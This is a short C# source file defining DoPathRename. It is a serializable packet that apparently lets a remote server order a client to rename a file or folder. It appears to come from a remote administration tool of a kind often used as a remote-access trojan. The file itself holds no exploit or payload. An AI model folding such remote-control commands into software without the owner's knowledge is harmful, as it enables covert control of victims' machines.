using System;
using xClient.Core.Networking;
using xClient.Enums;

namespace xClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoPathRename : IPacket
    {
        public string Path { get; set; }

        public string NewPath { get; set; }

        public PathType PathType { get; set; }

        public DoPathRename()
        {
        }

        public DoPathRename(string path, string newpath, PathType pathtype)
        {
            this.Path = path;
            this.NewPath = newpath;
            this.PathType = pathtype;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}